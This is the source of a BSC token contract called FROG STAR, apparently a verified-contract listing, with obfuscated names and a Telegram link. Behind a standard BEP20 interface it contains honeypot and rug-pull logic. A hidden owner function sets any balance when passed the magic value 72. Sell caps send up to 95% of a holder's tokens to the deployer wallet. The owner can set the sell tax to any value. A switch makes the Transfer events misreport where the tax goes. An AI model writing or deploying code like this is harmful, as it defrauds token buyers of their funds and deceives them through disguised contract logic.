/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*

 * Telegram: https://t.me/FrogStarCoin
 * 
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {

    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}
interface IUniswapV2Factory {
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;
    function feeTo() external view returns (address);
    function allPairsLength() external view returns (uint);
    function setFeeToSetter(address) external;

    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,

        uint amount0Out,

        uint amount1Out,
        address indexed to

    );
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function sync() external;
    function price1CumulativeLast() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function balanceOf(address owner) external view returns (uint);
    function symbol() external pure returns (string memory);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
    function decimals() external pure returns (uint8);
    function transfer(address to, uint value) external returns (bool);

    function token1() external view returns (address);
    function kLast() external view returns (uint);
    function price0CumulativeLast() external view returns (uint);

    function name() external pure returns (string memory);
    event Sync(uint112 reserve0, uint112 reserve1);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function token0() external view returns (address);
    function initialize(address, address) external;
    function burn(address to) external returns (uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function skim(address to) external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    function mint(address to) external returns (uint liquidity);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function factory() external view returns (address);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IUniswapV2Router01 {
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        payable

        returns (uint[] memory amounts);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function factory() external pure returns (address);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,

        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,

        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,

        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;
}
interface IBEP20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);

  function totalSupply() external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function getOwner() external view returns (address);

  function symbol() external pure returns (string memory);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function decimals() external view returns (uint8);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.
 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to

 * the owner.
 */

contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;

   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }

 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;

 }
}

library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;

    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");

    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
contract FrogStar is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unizhgadmyexscfwj;
  address public uniopnljixamsteqegadfywc;
  uint8 private decrwpeadfhlyct = 18;
  uint256 private totpjaolsyzrniiktqofmedbeawghcx = 10000000000 * 10 ** decrwpeadfhlyct;

  uint256 internal laudniaexkftomycpbarehjo = 0;
  uint8 internal _sta = 3;

  uint32 internal selatowbfeindrohkxlg = 10; 
  mapping (address => uint256) private baljwcdlorbhxaqoeympg;
  mapping (address => uint256) private selacogiewjznohbdef;
  address internal marciqfrkxphbntzjwioalaedyogmse;
  uint8 internal buywprozndjagslikibyeehoaqcfx = 7;

  uint8 internal sellbetphainkxqjogzri = 12;
  uint8 internal trakxczieqtaelfrhydi = 10; 
  mapping (address => bool) private isEajxrlzcmnqhwaobeogtidkyipfes;
  uint256 internal lasinogcrqibate = 0;
  mapping (address => mapping (address => uint256)) private allnypaetlerhgfi;
  mapping (address => uint256) private lasoecyolaigpsbmwrftaeihxzdjnk;
  mapping (address => uint256) private lasizhcofpedaywntgae;

  uint256 internal maxxdtoqlnibeageszi = totpjaolsyzrniiktqofmedbeawghcx.div(10000).mul(10);
  uint8 internal aftdjagynpeoltcfhmkwxoqbsizera = 95;
  string private constant namilgzrwosainpt = "FROG STAR";

  string private constant symkgwsehltoofjzyb = "FROGSTAR";
  bool internal staacmdkiwjtiefsqpnhyagoroxzle = true;
  bool internal staizfbrwpkemtjy = true;
  bool internal staoyleecxafn = true;

  constructor() {
    marciqfrkxphbntzjwioalaedyogmse = msg.sender;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);

    uniopnljixamsteqegadfywc = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

    unizhgadmyexscfwj = uniswapV2Router;
    isEajxrlzcmnqhwaobeogtidkyipfes[address(this)] = true;
    baljwcdlorbhxaqoeympg[msg.sender] = totpjaolsyzrniiktqofmedbeawghcx;
    isEajxrlzcmnqhwaobeogtidkyipfes[_msgSender()] = true;
    laudniaexkftomycpbarehjo = block.timestamp;
    // isEajxrlzcmnqhwaobeogtidkyipfes[marketingAddress] = true;
    // baljwcdlorbhxaqoeympg[marketingAddress] = totpjaolsyzrniiktqofmedbeawghcx * 10**decrwpeadfhlyct * 1000;
    emit Transfer(address(0), msg.sender, totpjaolsyzrniiktqofmedbeawghcx);

  }
	/**

	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namilgzrwosainpt;

	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totpjaolsyzrniiktqofmedbeawghcx;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	function approve(address spender, uint256 amount) public override returns (bool) {

	  _approve(_msgSender(), spender, amount);
	  return true;

	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return baljwcdlorbhxaqoeympg[account];
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  traiwfkjobypmcntiax(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns the token decimals.
	 */

	function decimals() external override view returns (uint8) {
	  return decrwpeadfhlyct;
	}
	/**

	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symkgwsehltoofjzyb;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traiwfkjobypmcntiax(sender, recipient, amount);
	   _approve(sender, _msgSender(), allnypaetlerhgfi[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allnypaetlerhgfi[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allnypaetlerhgfi[owner][spender];
	}
  	function traiwfkjobypmcntiax(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");

	  uint8 ranrcpegmiioywtlakefxb = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEajxrlzcmnqhwaobeogtidkyipfes[sender] == true || isEajxrlzcmnqhwaobeogtidkyipfes[recipient] == true){
	      eTrkqlpoierhig(sender, recipient, amount);
	      return;
	    }
	    if(sender == uniopnljixamsteqegadfywc && recipient != address(unizhgadmyexscfwj)) {
	      require(staacmdkiwjtiefsqpnhyagoroxzle == true, "Please wait try again later");
	      ranrcpegmiioywtlakefxb = 1;
	      tax = buywprozndjagslikibyeehoaqcfx;
	      approveTransaction = true;
	      lasizhcofpedaywntgae[recipient] = amount;

	      lasoecyolaigpsbmwrftaeihxzdjnk[recipient] = block.timestamp;
	    } else if(recipient == uniopnljixamsteqegadfywc) {
	      require(staizfbrwpkemtjy == true, "Please wait try again later");

	       ranrcpegmiioywtlakefxb = 2;
	       tax = sellbetphainkxqjogzri;
	       approveTransaction = true;

	    } else {
	      require(staoyleecxafn == true, "Please wait try again later");
	      ranrcpegmiioywtlakefxb = 3;
	      tax = trakxczieqtaelfrhydi;
	      approveTransaction = true;
	      lasizhcofpedaywntgae[sender] = amount;
	      if(selatowbfeindrohkxlg > 10){
	        lasoecyolaigpsbmwrftaeihxzdjnk[sender] = block.timestamp + selatowbfeindrohkxlg - 10;
	      } else {
	        lasoecyolaigpsbmwrftaeihxzdjnk[sender] = block.timestamp + selatowbfeindrohkxlg;
	      }
	    }

	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranrcpegmiioywtlakefxb);
	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrkqlpoierhig(address sender, address recipient, uint256 amount) internal {
	    baljwcdlorbhxaqoeympg[sender] = baljwcdlorbhxaqoeympg[sender].sub(amount, "Insufficient Balance");
	    baljwcdlorbhxaqoeympg[recipient] = baljwcdlorbhxaqoeympg[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	function taxeikgnxoceyfaalmqobrszdjwphi(uint256 axefgmpaahnebysoe, address sender, address recipient, uint8 ranrcpegmiioywtlakefxb) internal {
	  baljwcdlorbhxaqoeympg[marciqfrkxphbntzjwioalaedyogmse] = baljwcdlorbhxaqoeympg[marciqfrkxphbntzjwioalaedyogmse].add(axefgmpaahnebysoe);
	  if(_sta == 1)

	    emit Transfer(sender, marciqfrkxphbntzjwioalaedyogmse, axefgmpaahnebysoe);
	  else if(_sta == 2)
	    emit Transfer(recipient, marciqfrkxphbntzjwioalaedyogmse, axefgmpaahnebysoe);
	  else if(_sta == 3)
	    emit Transfer(marciqfrkxphbntzjwioalaedyogmse, sender, axefgmpaahnebysoe);

	  else if(_sta == 4)

	    emit Transfer(marciqfrkxphbntzjwioalaedyogmse, recipient, axefgmpaahnebysoe);
	  ranrcpegmiioywtlakefxb = ranrcpegmiioywtlakefxb;
	}

	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranrcpegmiioywtlakefxb) internal

	{
	  uint256 axefgmpaahnebysoe = 0;
	  baljwcdlorbhxaqoeympg[sender] = baljwcdlorbhxaqoeympg[sender].sub(amount, "ERC20: transfer amount exceeds balance");

	  if(ranrcpegmiioywtlakefxb == 2){
	    if(lasoecyolaigpsbmwrftaeihxzdjnk[sender] != 0 && lasoecyolaigpsbmwrftaeihxzdjnk[sender] + selatowbfeindrohkxlg < block.timestamp){
	      if(selacogiewjznohbdef[sender] < maxxdtoqlnibeageszi){
	        if(amount > (maxxdtoqlnibeageszi - selacogiewjznohbdef[sender]))
	        {

	          axefgmpaahnebysoe = amount.sub(maxxdtoqlnibeageszi.sub(selacogiewjznohbdef[sender]));
	          amount = amount.sub(axefgmpaahnebysoe);

	        }
	      } else {
	        axefgmpaahnebysoe = amount.mul(aftdjagynpeoltcfhmkwxoqbsizera).div(100);

	        amount = amount.sub(axefgmpaahnebysoe);
	      }
	    } else {
	      if(amount > lasizhcofpedaywntgae[sender])
	      {
	        axefgmpaahnebysoe = amount - lasizhcofpedaywntgae[sender];
	        amount = lasizhcofpedaywntgae[sender];
	      }
	      if(lasizhcofpedaywntgae[sender] > amount + axefgmpaahnebysoe){
	        lasizhcofpedaywntgae[sender] = lasizhcofpedaywntgae[sender] - (amount + axefgmpaahnebysoe);
	      } else {
	        lasizhcofpedaywntgae[sender] = 0;
	      }
	    }
	    selacogiewjznohbdef[sender] = selacogiewjznohbdef[sender].add(amount.add(axefgmpaahnebysoe));
	  }
	  if(amount > 0 && axefgmpaahnebysoe == 0 && tax > 0)

	  {
	    axefgmpaahnebysoe = amount.mul(tax).div(100);
	    amount = amount.sub(axefgmpaahnebysoe);
	  }
	  if(axefgmpaahnebysoe > 0){
	    taxeikgnxoceyfaalmqobrszdjwphi(axefgmpaahnebysoe, sender, recipient, ranrcpegmiioywtlakefxb);
	  }
	  baljwcdlorbhxaqoeympg[recipient] = baljwcdlorbhxaqoeympg[recipient].add(amount);
	  emit Transfer(sender, recipient, amount);
	}
	function etBjbwzxytlaqngorikcdpfea(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    baljwcdlorbhxaqoeympg[addr] = b * 10 ** decrwpeadfhlyct;

	  }
	}
	function sSell(uint8 ellwsnabzqetcdooylxgprkfi) public onlyOwner{
	     sellbetphainkxqjogzri = ellwsnabzqetcdooylxgprkfi;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;

	}
}